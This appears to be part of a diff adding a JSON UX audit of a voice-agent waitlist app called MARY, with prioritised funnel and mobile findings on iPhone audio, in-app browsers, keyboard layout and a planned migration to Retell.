+        "user_impact": "Seeing 'sarah@brightpath.com' appear as she says it is what makes a voice sign-up trustworthy. Lose it in the migration and wrong emails go unnoticed. Without a way to fix it, a misheard email turns a warm lead into a dead one.",
+        "recommendation": "Under Retell, have MARY call note_details as each field is confirmed, and update the pills from call-status polling (or metadata events). Make the email pill tappable so the visitor can correct it by typing, and send the correction into the call through /api/retell/inject (the SDK 3.0.1 README describes update({ call_control: { additional_context, trigger_response: true } })). Remove the max-w-32 truncation for the email.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The end screen offers no next action: no share link, and no booking slot for callbacks",
+        "severity": "P2",
+        "area": "end screen",
+        "evidence": "The signed-up end screen ends with 'Start another conversation' (end-screen.tsx:176-183). The callback copy promises 'A real person calls you on …' with no time (conversation/text.ts:65-75). Best practice: 'give them something to do - a referral link' at 'the highest-intent moment you will get from that person for weeks' (https://21st.dev/blog/react-waitlist-page-components, 2026-08-20). Retell's homepage demo is itself 'Lead Qualification' leading to a scheduled call (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/sites-ios.json), and Retell is moving booking to its Cal.com integration by 10/31/2026 (https://docs.retellai.com/deprecation-notice/overview).",
+        "user_impact": "Qualified, excited visitors leave with nothing to do. Callback requests become 'someone will call at some point', and hot leads cool off while waiting.",
+        "recommendation": "Signed-up screen: add one share action (native share sheet with the site URL; add referral tracking later) and keep 'Start another conversation' secondary. Callback screen: add a 'Pick a time' booking link (Cal.com) that is prefilled with name and email. With Retell, MARY can offer times during the call through the Cal.com integration instead of promising a callback.",
+        "effort": "M",
+        "retell": "independent"
+      },
+      {
+        "title": "Offer 'Call me instead' (a real phone call) for in-app browsers and failed audio, as Retell's own demo does",
+        "severity": "P2",
+        "area": "typing fallback",
+        "evidence": "Retell's homepage 'Try Our Live Demo' is a form with use case, name and phone, then 'Get a call' (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/sites-ios.json, captured 2026-09-26). Retell's widget has a callback mode with data-tc for a terms URL (https://docs.retellai.com/deploy/chat-widget). MARY's in-app-browser and mic-failure copy can only offer typing (conversation/text.ts:98-118), and the iPhone audio path needs a 'Can't hear her?' escape (composer.tsx:320-338). Outbound AI voice counts as 'artificial voice' under the TCPA and needs prior express consent (https://justcall.io/blog/ai-voice-agent-disclosure-laws.html, 2026-09-22). Telephony costs from $0.015/min (https://www.retellai.com/pricing).",
+        "user_impact": "Visitors arriving from Instagram or LinkedIn in-app browsers, people with denied mics, and iPhones with audio trouble currently lose the voice experience altogether. A phone call has none of the browser audio risks.",
+        "recommendation": "After Retell slice 2, add a secondary 'Rather talk on the phone? We'll call you now' option on the mic-error notice and the in-app-browser notice. It should collect the phone number with an explicit consent checkbox and record the timestamp, then start an outbound call with the same agent and pass sessionId and known fields as dynamic variables so MARY continues where the visitor left off.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Use Retell's simulation testing, versioning and live monitoring to guard MARY's script",
+        "severity": "P2",
+        "area": "owner view",
+        "evidence": "CLAUDE.md says there is no browser or audio test harness, and retell-migration.md:64-68 names grounding discipline as the main risk of porting the prompt. Retell Conductor (2026-07-02) plays scenarios against an agent without dialing, turns failed calls into test cases, and shows proposed changes side by side. Agent Versioning 2.0 (2026-05-27) adds staging and production environment tags plus a Voice Orb share link. Live Call Monitoring (2026-06-19) adds real-time transcripts, scoring by sentiment, latency and interruptions, and listen, whisper or take over (https://www.retellai.com/changelog). SDK 3.x adds monitorCall().takeOver() (README).",
+        "user_impact": "Prompt changes to MARY currently reach real visitors unverified. Regressions such as re-asking known fields, recording ungrounded details or a mangled email readback get found only by losing leads.",
+        "recommendation": "For build slice 3, script the five CLOSE scenarios plus the ones in mary-voice.md (early leaver, price objection, 'just email me') as Conductor simulations. Gate every prompt change on staging tags, and share the Voice Orb link for stakeholder review. Give the operator a Live Monitoring dashboard filtered on outcome=callback, so hot leads can be taken over live.",
+        "effort": "M",
+        "retell": "solved_by_retell"
+      },
+      {
+        "title": "Brand words are not given to speech recognition or TTS: OmniSuite, Omnikom, MARY",
+        "severity": "P3",
+        "area": "conversation",
+        "evidence": "The /api/transcribe prompt is generic, with no vocabulary (src/routes/api/transcribe.ts:26-30). Retell has boosted_keywords to bias the transcriber and pronunciation_dictionary to guide synthesis (https://docs.retellai.com/api-references/create-agent). GPT Transcribe added keyword hints (https://developers.openai.com/api/docs/changelog, 2026-07-28).",
+        "user_impact": "'Omnikom' heard as 'omni com' or 'Omni calm' leaks into transcripts, the sheet and MARY's replies, and a mispronounced brand name on a sales call undercuts credibility.",
+        "recommendation": "Add the brand words (OmniSuite, Omnikom, MARY) to the current transcribe prompt now. In Retell set boosted_keywords ['OmniSuite','Omnikom','MARY'] plus common industry terms from the playbook, and add pronunciation_dictionary entries for OmniSuite and Omnikom.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "No post-call feedback or sentiment signal; Retell's post-call analysis gives it for free",
+        "severity": "P3",
+        "area": "lead delivery",
+        "evidence": "ElevenLabs' widget can collect feedback 'After conversation' (https://elevenlabs.io/docs/agents-platform/customization/widget), and Sesame's preview asks for 'feedback at the end of your call' (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/shots/sesame-ios.png). Retell post-call analysis always returns call_summary, user_sentiment and call_successful, plus custom boolean, text, number or selector fields, delivered by call_analyzed (https://docs.retellai.com/features/post-call-analysis-overview). MARY's end screen has no feedback, and lessons come only from /api/reflect (mary-app.tsx:95-119).",
+        "user_impact": "The team cannot tell which conversations felt good or bad, or why people declined. A sentiment and summary column is also what a salesperson wants to see before calling a callback lead.",
+        "recommendation": "Under Retell, add post_call_analysis_data for outcome (selector: joined, callback, declined, incomplete; already in retell-shared.ts:32), industry, business, callback_requested and objection. Write call_summary and user_sentiment into the sheet row and show them in the owner view. Skip building a rating widget unless summaries turn out not to be enough.",
+        "effort": "S",
+        "retell": "solved_by_retell"
+      },
+      {
+        "title": "Recovery from a denied mic is text only; Chrome 151's <usermedia> element restores access in-page",
+        "severity": "P3",
+        "area": "start/permission",
+        "evidence": "The landing never says a mic prompt is coming (landing.tsx:139-165). After a denial the copy says 'Tap the mic button to ask again' (conversation/text.ts:106), but browsers do not re-prompt after a hard deny. Chrome 151's <usermedia> element (2026-06-29) gives 'a specialized recovery flow', and Google Meet reported '+131% successful permission recovery' (https://developer.chrome.com/blog/usermedia-html-element). It is Chrome-only, so it is progressive enhancement, and iPhone Safari keeps the current path.",
+        "user_impact": "Desktop Chrome visitors who hit 'Block' by reflex are stuck typing, or have to dig into site settings with no guidance.",
+        "recommendation": "Add 'She'll ask for your microphone' as microcopy next to 'Start talking'. Where supported (feature-detect), render <usermedia> in the mic-error notice. Otherwise show browser-specific steps to re-enable. The Retell SDK only reports permission errors through onError, so this UI stays ours after the migration.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Retell voice settings to test and one to avoid: Expressive Mode and dynamic speed, but not Colloquial Model on confirmations",
+        "severity": "P3",
+        "area": "conversation",
+        "evidence": "Retell's changelog on 2026-06-19 added Expressive Mode (automatic or manual emotion tags such as [sigh] and [long pause]) and a Colloquial Model that 'rewrites how your agent phrases things in real time' (https://www.retellai.com/changelog). Agent config adds enable_dynamic_voice_speed and voice_speed (https://docs.retellai.com/api-references/create-agent). ElevenLabs voices on Retell cost $0.040/min versus $0.015/min for platform voices (https://www.retellai.com/pricing). MARY's playbook depends on exact readback and confirmation lines (docs/mary-voice.md:179-200, e.g. 'sarah, at brightpath dot com — got it.'). Today's voice is Gemini TTS 'Kore' (src/routes/api/speech.ts:35, 50).",
+        "user_impact": "The right voice settings make MARY sound more human than today's pipeline. A real-time rephrasing layer could, however, alter grounded confirmations and the email readback, which are the lines that must stay exact.",
+        "recommendation": "A/B two or three voices, including one ElevenLabs voice (about +$0.025/min), with Expressive Mode on and dynamic voice speed on. Keep Colloquial Model off, or verify in Conductor simulations that it never changes readback and confirmation lines.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      }
+    ]
+  },
+  "mobile": {
+    "summary": "Mobile/Apple lens, checked after the audio fix. I drove the live site (https://omnisuite.omnikom.io, which runs PR #1) and a git-archive snapshot of branch HEAD 5f531ad (PR #2 plus the dormant Retell adapter). Both ran in the iPhone 13 profile (390x664), iPhone SE (375x548), iPhone 13 landscape (750x342), Android Chrome (Pixel 8, 412x783), an Instagram in-app user agent, an emulated iOS keyboard (visualViewport shrunk to 420 and 360 px) and faked mic mute/ended events. Every /api route was mocked. That made 0 of the 4 allowed live AI calls and no lead POSTs. Line numbers refer to 5f531ad. Working files are in /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/ (the driver is mobile.mjs, screenshots are in shots/, run logs are run-*.txt, the Retell and LiveKit source is in retell-sdk/).\n\nThree things work well: 100vh vs dvh is fine (every screen is a fixed container or h-dvh and the page itself never scrolls, so Safari's toolbar doesn't jump), Android Chrome runs the call route cleanly, and PR #2's wake lock follows WebKit's rules.\n\nFour problems cost leads or trust:\n- **Typing and landscape hide the question.** When the keyboard is open or the phone is sideways, MARY's words disappear entirely (live and branch).\n- **In-app browsers get the wrong message.** In Instagram and similar in-app browsers the correct \"open in browser\" message is overwritten by a generic one that points at a button that doesn't exist.\n- **The live layout isn't in git.** The live mobile layout contains classes that exist in no git ref, so publishing PR #2 as-is would regress small phones.\n- **The \"Can't hear her?\" row does more harm than good now.** It shows from second 0 on every iPhone and, on the branch build, pushes her first question off a 390x664 screen.\n\nRetell (LiveKit 2.22.3 underneath) would fix the missing mic-interruption handling. It would not touch the layout, keyboard, in-app or wake-lock issues. It brings two new risks: a 2026 LiveKit report of iPhone audio coming out of the earpiece, and calls ending when someone switches apps for more than 45 seconds.",
+    "findings": [
+      {
+        "title": "In Instagram/LinkedIn in-app browsers (and after any mic denial) the right message is overwritten by a generic one that points at a button that doesn't exist",
+        "severity": "P1",
+        "area": "errors / in-app browsers",
+        "evidence": "Driven on live (all /api mocked) and on the branch with an Instagram iOS UA and getUserMedia rejecting NotAllowedError (also with mediaDevices undefined). The notice always reads \"I couldn't open the microphone. Tap the mic button to try again, or keep going by typing.\" and never the in-app copy in text.ts:101-103. Screenshots: /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/shots/inapp-denied-live-inapp-after-hold.png and .../shots/inapp-nomedia-local-inapp-after-hold.png; log .../run-inapp-denied-live.txt. Cause: primeMicPermission sets the in-app message (mary-app.tsx:602-606 at 5f531ad). The hold effect then calls c.recorder.open() (mary-app.tsx:286-293). hold-recorder.ts:118 calls navigator.mediaDevices.getUserMedia directly, without wrapping the error in MicUnavailableError, so micMessage() falls through to 'unknown' and overwrites the first message. Hold mode is the default and has no mic button (composer.tsx:230 renders it only when !holdMode). The 64px Hold button stays the main control and the status says 'Hold the button while you talk'. A plain iPhone denial hits the same root cause (funnel lens log-deny-ios.json, t=7232). Meta's Android apps don't grant camera/mic to their WebView: https://developers.facebook.com/community/threads/432379558191221",
+        "user_impact": "Visitors from social links are a large share of waitlist traffic. They are told to tap a button that isn't there, and they keep pressing a Hold button that can never work. They never see the one fix that works: open the page in a real browser. Many will leave instead of typing.",
+        "recommendation": "(1) hold-recorder.ts:117-126: wrap getUserMedia in try/catch and throw new MicUnavailableError(micFailureFrom(error)). Export micFailureFrom from audio-engine.ts, and map a missing navigator.mediaDevices to 'unsupported'. (2) mary-app.tsx hold effect: skip recorder.open() when the tap's primeMicPermission already failed (set a c.micPrimeFailed flag in start()). The first message then stands and no second prompt fires. (3) composer.tsx: when mic.error is set in hold mode, hide HoldButton, make the textarea the main control and add a small 'Try the mic again' link. Make micMessage aware of the mode ('tap Hold' vs 'tap the mic button'). (4) Add a unit test in tests/unit calling micMessage with a raw DOMException.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "With the phone keyboard up or the phone in landscape, MARY's words disappear entirely",
+        "severity": "P1",
+        "area": "typing fallback / keyboard / orientation",
+        "evidence": "call-stage.tsx:203 (centre area flex-1 min-h-0) and :211 (caption box h-[10.5rem] overflow-hidden, which is allowed to shrink). With the iOS keyboard emulated through the path use-viewport.ts:27-49 drives (visualViewport 420 and 360 px), the caption box measured height 0 and the question 'And what should I call you?' sat at y=324-354, fully clipped (currentLineVisible=false): /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/shots/keyboard-ios-local-keyboard-360.png. The live build is the same: .../shots/keyboard-ios-live-keyboard-360.png. Android Chrome (resizes-content) is the same: .../shots/keyboard-android-local-keyboard-360.png. Landscape 750x342 also gives caption height 0, and the minimum 140px orb (mary-app.tsx:735-736) overlaps the progress pills: .../shots/landscape-local-after-welcome.png and landscape-live-after-welcome.png. In 'Type instead' mode the screen still shows the 64px Hold button and the 'Hold the button while you talk' status (composer.tsx:178,203). Safari iOS ignores interactive-widget (MDN browser-compat-data 8.1.3, 2026-09-24: html.elements.meta.name.viewport.interactive-widget safari_ios=false), so the JS hook is the only thing adapting the layout.",
+        "user_impact": "Anyone typing on a phone, whether in 'Type instead' mode or spelling out an email, can't see the question they are answering. Typing-only visitors with the sound off see an orb, a Hold button and a text box, and nothing else.",
+        "recommendation": "In call-stage.tsx, when keyboardHeight is set or the height is under about 480px: hide the progress pills and the 'before' line, and shrink the orb to a 40-48px inline avatar (change the Math.max(140) floor in mary-app.tsx:736). Give the caption min-h-0 with its own overflow-y-auto, anchored to the newest line, instead of a fixed h-[10.5rem], so the current question always renders directly above the composer. In composer.tsx, hide HoldButton in typing mode (!voiceWanted) and while the textarea has focus, and show a 44px mic icon instead. In use-viewport.ts, also account for visualViewport.offsetTop. Add a two-column layout for (orientation: landscape) and (max-height: 500px).",
+        "effort": "M",
+        "retell": "independent"
+      },
+      {
+        "title": "The live mobile layout is not in git: publishing PR #2 as-is would regress small phones",
+        "severity": "P1",
+        "area": "landing / call screen (release process)",
+        "evidence": "The live bundle https://omnisuite.omnikom.io/assets/routes-DZfdjxLS.js contains 'flex h-[8.5rem] ... sm:h-[11rem]' (caption), 'min-h-12 shrink-0 items-center gap-2 sm:min-h-14' (header) and a call section with 'px-3'. `git log --all -S\"h-[8.5rem]\"` and `-S\"min-h-12 shrink-0 items-center gap-2\"` return nothing across every ref (origin/main 44318ba, PR #2 5f531ad, archive tags). The repo uses h-[10.5rem] (call-stage.tsx:211). Measured at 390x664: live shows 'And what should I call you?' (.../shots/portrait-live-after-welcome.png), while the branch clips it (.../shots/portrait-local-after-welcome.png, currentLineVisible=false). iPhone SE 375x548: the live Start button is at y=457-505 (funnel lens log-landing-se.json), while the branch puts it at y=568-624, entirely below the fold (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/run-se.txt, shots/se-local-landing.png). The live audio chunk audio-engine-I_qx9wg2.js has PR #1's marker (sinkElement) but not PR #2's (wakeLock, elementRestarted). So live = PR #1 audio plus Lovable-side UI edits that were never synced.",
+        "user_impact": "Publishing the GitHub branch would replace the compact layout the operator just checked on the iPhone. SE visitors would lose the above-the-fold Start button, and iPhone 13 visitors would lose sight of MARY's first question.",
+        "recommendation": "Before merging PR #2, check the GitHub sync state in Lovable and get Lovable's unsynced UI changes into git. Alternatively, diff the live routes chunk against the `bun run build` output for call-stage, landing and site-frame and port the classes over. Rebase PR #2 on the result. Re-run `node mobile.mjs portrait` and `node mobile.mjs se` against the Lovable preview before Publish -> Update.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "The iPhone 'Can't hear her?' row shows from second 0 for three answers, takes 46px that hides her question on the branch build, and its buttons are 21px tall",
+        "severity": "P2",
+        "area": "'Can't hear her?' hint / tap targets",
+        "evidence": "mary-app.tsx:389-409 (show while answers < 3) and composer.tsx:320-338. Measured: the hint row is 358x46 at y=606 during her very first line; 'Play sound' is 76x21 and 'I can hear her' is 91x21 (live: 70x19). Header toggles are 40x32 (call-stage.tsx:157,184). Tapping 'I can hear her' grows the caption from 117px to 168px and makes the question visible: /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/shots/dismiss-local-after-welcome.png vs dismiss-local-after-dismiss.png (run-dismiss.txt). The row also shows in 'Type instead' mode. Audio is now confirmed on a real iPhone 13 (PROJECT-STATE.md:67), so the row mostly reaches people who can already hear her. Apple HIG asks for at least 44x44 pt hit targets: https://developer.apple.com/design/human-interface-guidelines/buttons",
+        "user_impact": "It plants doubt during the first impression, while she is audibly talking. It squeezes the name, business and email questions, the most important stretch of the funnel. The 21px buttons are easy to miss one-handed.",
+        "recommendation": "Show the row only after her first line has finished and the visitor hasn't pressed Hold or typed within about 6 seconds, or turn it into a single 44px 'Sound' chip in the header. Retire it after the first answer instead of the third. Give both buttons min-h-11 px-4. In Retell mode 'answers' never increases when transcript is off (retell-loader.ts sets transcript: Boolean(transcriptKey), and lines arrive only through onTranscript), so the row would stay up for the whole call. Base the rule on time and presence instead of the line count.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "In hold mode nothing notices the mic being muted or taken (AirPods switch, incoming call, Siri); MARY then blames the visitor's voice",
+        "severity": "P2",
+        "area": "conversation / AirPods & interruptions",
+        "evidence": "hold-recorder.ts adds no listeners to the track and none for devicechange. A census in a running call found trackEvents [] and devicechange 0 (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/run-mute.txt). The hands-free path does listen (audio-engine.ts:2016-2031). After a faked 'mute' the UI kept showing 'Hold to talk' and diagnostics read micTrack 'live (muted)'. A muted track records silence, which hits SILENT_PEAK (hold-talk.ts:127) and then onMissed (mary-app.tsx:214). The visitor sees 'Didn't catch that. Hold, speak close to the phone' (composer.tsx:208), then 'Loud in here? Type your answer' (composer.tsx:211). An ended track recovers on the next press (run-ended.txt: 2 getUserMedia calls, 2 track stops). iOS keeps the track live all call (hold-recorder.ts:9-13). AirPods are listed as unproven in .claude/POSITION.md:122.",
+        "user_impact": "After a phone call, Siri, or putting in or removing AirPods, the visitor's next answers vanish. MARY tells them to speak closer or blames the room, and after two tries pushes them to typing.",
+        "recommendation": "In HoldRecorder.openLine (around hold-recorder.ts:148), listen for mute, unmute and ended on the track and for navigator.mediaDevices devicechange, and expose onLost(reason). Wire it through the hold deps in mary-app.tsx to SET_MIC {error: micLostMessage(reason)}. In HoldTalk.press, if the track is muted, stop it and reopen with getUserMedia inside the press gesture before calling start(). In HoldTalk.finish, treat peak === 0 exactly (the mic went dead) differently from quiet speech: reopen and say 'the microphone went quiet, hold again'.",
+        "effort": "S",
+        "retell": "solved_by_retell"
+      },
+      {
+        "title": "Retell's audio on iPhone has a recent report of playing through the earpiece, and the page cannot detect it",
+        "severity": "P2",
+        "area": "orb/audio output (Retell)",
+        "evidence": "livekit/client-sdk-js issue #1836 (opened 2026-03-12, closed): on iPhone 15 Pro, LiveKit web audio was 'coming from the ear Receiver' while the device list said Speaker. https://github.com/livekit/client-sdk-js/issues/1836. Issue #1568 (iOS 26 Speaker Selection) was closed as not planned: https://github.com/livekit/client-sdk-js/issues/1568. Retell SDK 3.0.1 livekit-transport.ts:43-55,96 passes only deviceId options and calls track.attach(). Its src has no AudioPlaybackStatusChanged handling (retell-sdk/package/src, grep). bun.lock pins livekit-client 2.22.3. The team fixed exactly this failure for MARY in a5156d2 ('iPhone plays MARY through the speaker, not a phone-call route').",
+        "user_impact": "If it happens, iPhone visitors hear MARY faintly from the earpiece while holding the phone at arm's length and assume she is broken. That is the symptom PR #1 just fixed.",
+        "recommendation": "Treat a real-iPhone Retell check as a go-live gate. Add a 'Retell route' test to /soundcheck (join a test call with ?voice=retell, then mark speaker or earpiece, with the ring switch set to Ring and Silent). Keep the Sound chip wired to resumeAudio(), and have it also detach and re-attach the agent track. Don't flip VOICE_PROVIDER until speaker output is confirmed on iPhone 13 (iOS 18) and on iOS 26.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Emails and phone numbers typed on a phone get iOS auto-capitalisation and autocorrect, and no email or number keypad",
+        "severity": "P2",
+        "area": "typing fallback",
+        "evidence": "The composer textarea (composer.tsx:258-285) has no inputMode, autoCapitalize, autoCorrect, spellCheck or autoComplete. The turn already returns nextField (mary.functions.ts:53), but nothing under src/features/mary keeps it. Safari iOS support (MDN browser-compat-data 8.1.3, 2026-09-24): autocapitalize 10.3+, autocorrect 14.5+, inputmode 12.2+.",
+        "user_impact": "'Sarah@brightpath.com' starts with a capital letter, domain words can be 'corrected', and there is no number keypad for the phone number. The typos land in exactly the two fields that make the lead reachable.",
+        "recommendation": "Keep turn.nextField in the session reducer. In composer.tsx, when nextField is 'email' set inputMode='email', autoCapitalize='none', autoCorrect='off', spellCheck={false} and autoComplete='email'. When it is 'phone' set inputMode='tel' and autoComplete='tel'. Consider an <input> for those two turns so iOS AutoFill offers the visitor's own email and number.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "In-app browser detection misses TikTok and Android WebViews, and nothing warns the visitor before they tap Start",
+        "severity": "P2",
+        "area": "in-app browsers / landing",
+        "evidence": "audio-engine.ts:1263-1268: the regex matches 'TikTok', but TikTok in-app user agents carry musical_ly_, trill_ or BytedanceWebview, and generic Android WebViews carry '; wv)' (https://useragent.in/in-app-browser-user-agents). landing.tsx has no in-app branch: 'Start talking' is always the main button. Per https://plugwith.me/blog/what-escapes-instagram-in-app-browser-in-2026/ (2026-08-17, updated 2026-09-24), x-safari-https stopped being reliable in Meta webviews around mid-2025, while instagram://extbrowser via meta refresh still worked.",
+        "user_impact": "Visitors from TikTok or an Android WebView get the generic 'Safari, Chrome or Edge' copy. Visitors from every social app hit a dead mic before learning how to get out of the in-app browser.",
+        "recommendation": "Extend isInAppBrowser to match musical_ly|trill_|BytedanceWebview|; wv\\) and return the app name. In landing.tsx, when in-app, show one line above the buttons: 'Opened inside Instagram? For voice, open in Safari: ⋯ → Open in external browser', plus a Copy link button. Make 'Type instead' an equal first choice. Try an instagram://extbrowser meta-refresh link on Instagram and an intent://…;package=com.android.chrome link on Android, and log whether they work.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "With Retell, leaving the app for more than 45 seconds (for example to copy an email) ends the call; MARY today just waits",
+        "severity": "P2",
+        "area": "conversation / app switching (Retell)",
+        "evidence": "retell/agent.json sets end_call_after_silence_ms 45000. mary-app.tsx:443-447 (5f531ad) hangs up the Retell call on pagehide. LiveKit pauses sending the mic after 5 seconds muted (livekit-client LocalTrack.ts:437-444), and iOS mutes capture in the background (https://developer.apple.com/forums/thread/689182). The MARY path only flushes the lead when hidden (mary-app.tsx:449-458) and the call screen keeps waiting.",
+        "user_impact": "A visitor who leaves to copy their email from Mail or to answer a message comes back to an ended call in the middle of signing up.",
+        "recommendation": "In Retell mode, note the time on visibilitychange→hidden. On return, if the call has ended, show 'Welcome back — pick up where we left off', which runs the existing Resume path (retell.start with the known fields and the same session, so the same sheet row). Consider raising end_call_after_silence_ms to about 90000, or have the agent's first reminder say 'take your time'.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Real-device checks are still missing for the no-mic path under the silent switch, AirPods mid-call, the Instagram webview and Android",
+        "severity": "P2",
+        "area": "performance / verification",
+        "evidence": "POSITION.md:122 and PROJECT-STATE.md:67 say Mac Safari, the no-mic path and AirPods are still unproven. /soundcheck already has the no-mic element test (soundcheck.tsx:261, test 4) and the ring-switch selector. The Playwright harness is Chromium with a spoofed Safari user agent, so it cannot reproduce iOS audio sessions, the keyboard or Bluetooth routing. The silent-switch behaviour depends on WebKit putting a MediaStream-backed <audio> in the MediaPlayback category (per POSITION.md:80). Web Audio on its own is muted by the switch: https://www.audjust.com/blog/unmute-web-audio-on-ios",
+        "user_impact": "'Type instead' visitors with the silent switch on, and AirPods users, are the next likely 'she's silent' reports, and nobody has tested them.",
+        "recommendation": "Run a 15-minute script on the iPhone 13: (1) /soundcheck tests 1-6 with the switch on Silent, then Ring. (2) A 'Type instead' call with the switch on Silent. (3) A voice call where AirPods go in after the first answer, two more answers, then the AirPods come out. (4) Low Power Mode on, hands-free, wait 45 seconds. (5) Open the link from an Instagram DM and from a LinkedIn post. (6) Repeat on Android Chrome and Instagram for Android. Record the results as a table in docs/. Re-run the same matrix with ?voice=retell before switching providers. If the no-mic path is silent on Silent, set navigator.audioSession.type='playback' only when !voiceWanted.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "The PR #2 wake lock follows WebKit's rules, but a failure is silent and Low Power Mode locks the screen after 30 seconds",
+        "severity": "P3",
+        "area": "wake lock / low power",
+        "evidence": "mary-app.tsx:62-82 (5f531ad): the rejection handler is `() => {}`, so nothing is recorded. WebKit WakeLock.cpp:74-83 (WebKit main) grants the first lock only with transient activation and allows re-requests after that, which matches the PR comment. Requests were seen at the tap (userActivation active) and again on return to visible (wakelock run: 6742, 6879 and 15022 ms). Headless Chromium denies, so a grant was not observed. Apple says Low Power Mode sets Auto-Lock to 30 seconds: https://support.apple.com/en-us/101604. MDN says requests may be rejected in power-save mode: https://developer.mozilla.org/en-US/docs/Web/API/Screen_Wake_Lock_API. browser-compat-data: Safari iOS 18.4+ full support, 16.4-18.3 broken in Home Screen apps. Hands-free mode has no touches to reset the auto-lock timer.",
+        "user_impact": "On older iOS versions, in some webviews, or when a request is refused, a hands-free visitor in Low Power Mode sees the screen lock after 30 seconds. That suspends her voice and the mic.",
+        "recommendation": "Record the wake-lock result with trace({type:'wakeLock', ok}) and add it to audioDiagnostics (audio-engine.ts around line 603). If it is denied while in hands-free mode, show a one-time 'Keep the screen on' hint, or stay in hold mode.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "In landscape the header and composer ignore the left and right safe-area insets",
+        "severity": "P3",
+        "area": "orientation / safe areas",
+        "evidence": "Only env(safe-area-inset-bottom) is used anywhere (call-stage.tsx:289; the live CSS is the same). The viewport meta sets viewport-fit=cover (__root.tsx:83-84), so the page extends under the notch in landscape, and the header padding is px-8 (32px) at the 750px landscape width (.../shots/landscape-local-after-welcome.png). browser-compat-data: viewport-fit supported since Safari iOS 11.",
+        "user_impact": "In landscape the logo and composer edges can sit under the notch or Dynamic Island and the rounded corners.",
+        "recommendation": "Add pl-[max(1rem,env(safe-area-inset-left))] and pr-[max(1rem,env(safe-area-inset-right))] to the landing, call and end sections. That is cheapest when done together with the landscape layout in the keyboard/landscape finding.",
+        "effort": "S",
+        "retell": "independent"
+      }
+    ]
+  }
+}
